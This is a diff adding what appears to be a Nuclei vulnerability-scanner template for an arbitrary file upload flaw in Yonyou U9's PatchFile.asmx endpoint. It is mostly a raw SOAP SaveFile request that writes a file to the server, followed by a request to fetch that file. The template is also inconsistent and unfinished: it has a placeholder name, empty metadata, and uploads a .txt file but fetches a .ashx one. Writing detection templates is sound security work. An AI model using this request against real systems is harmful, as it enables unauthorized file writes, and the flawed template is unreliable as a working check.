@@ -1,0 +1,52 @@
+id: yonyou-u9-PatchFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 用友U9 patchfile存在任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
+        Content-Length: 425
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/SaveFile"
+
+        <?xml version="1.0" encoding="utf-8"?>
+         <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+           <SaveFile xmlns="http://tempuri.org/">
+            <binData>d2hvaXNjZXNoaQ==</binData>
+
+            <path>./</path>
+
+            <fileName>{{filename}}.txt</fileName>
+
+           </SaveFile>
+
+          </soap:Body>
+
+         </soap:Envelope>
+      - |+
+        GET /CS/Office/AutoUpdates/{{filename}}.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
